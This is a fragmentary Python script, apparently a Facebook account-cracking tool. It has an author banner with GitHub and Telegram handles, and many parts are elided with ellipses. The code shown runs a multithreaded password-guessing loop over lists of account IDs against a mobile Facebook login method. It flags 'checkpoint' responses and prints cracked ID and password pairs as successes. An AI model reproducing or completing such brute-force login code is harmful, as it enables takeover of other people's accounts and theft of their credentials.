...
=================================================
{P} [{H}■{P}] Author    : 709
{P} [{H}■{P}] Github    : RAWA-IRAQI
{P} [{H}■{P}] TELEGRAM  : @RAWA_750
{P} [{H}■{P}] CHANAL : LUNACRACKER
=================================================
...
def setting():
	...
	if hu in ['30','030']:
		...
		print('')
		exit()
	print('\x1b[1;97m Mobil.facebook.com =   \x1b[1;97m[\x1b[1;32m01\x1b[1;97m]')	
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackfree,idf,pwv)
	print('')
	cetak(nel('\t[cyan]-[green] CRACK KOTAY HAT [cyan] =[white] '))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{Z}[MRBX]{P} {Z}[{Z}{loop}{Z}/{Z}{len(id)}{Z}]—{Z}[{H}{ok}{Z}]—[{K}{cp}{Z}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{Z}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{b}[Successfull] {b}{idf} | {b}{pw}')
